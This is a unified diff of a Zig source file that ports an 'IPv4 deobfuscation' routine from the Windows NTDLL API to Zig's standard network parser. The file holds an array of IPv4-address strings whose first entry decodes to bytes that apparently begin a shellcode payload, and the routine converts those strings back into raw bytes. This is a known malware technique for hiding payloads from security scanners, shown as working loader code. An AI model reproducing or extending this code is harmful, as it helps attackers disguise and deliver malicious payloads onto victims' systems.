@@ -1,6 +1,5 @@
 const std = @import("std");
-const windows = std.os.windows;
-const WINAPI = windows.WINAPI;
+const net = std.net;
 
 const IPV4_ARRAY: [49][]const u8 = [_][]const u8{
     "252.232.130.0",
@@ -56,23 +55,13 @@ const IPV4_ARRAY: [49][]const u8 = [_][]const u8{
 const NUMBER_OF_ELEMENTS: usize = 49;
 
 fn ipv4Deobfuscation(ipv4_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
-    const ntdll = try windows.kernel32.GetModuleHandleA("NTDLL");
-    const RtlIpv4StringToAddressA = @as(
-        *const fn([*:0]const u8, i32, [*]?[*:0]const u8, [*]u8) callconv(WINAPI) i32,
-        @ptrCast(windows.kernel32.GetProcAddress(ntdll, "RtlIpv4StringToAddressA").?),
-    );
-
     var buffer = try allocator.alloc(u8, ipv4_array.len * 4);
     var offset: usize = 0;
 
     for (ipv4_array) |ip| {
-        const c_ip = try allocator.dupeZ(u8, ip);
-        defer allocator.free(c_ip);
-        var terminator: ?[*:0]const u8 = null;
-        const result = RtlIpv4StringToAddressA(c_ip.ptr, 0, &terminator, buffer.ptr + offset);
-        if (result != 0) {
-            return error.RtlIpv4StringToAddressAFailed;
-        }
+        const addr = net.Address.parseIp4(ip, 0) catch return error.InvalidIpFormat;
+        const ip_bytes = @as([4]u8, @bitCast(addr.in.sa.addr));
+        @memcpy(buffer[offset..offset + 4], &ip_bytes);
         offset += 4;
     }
 
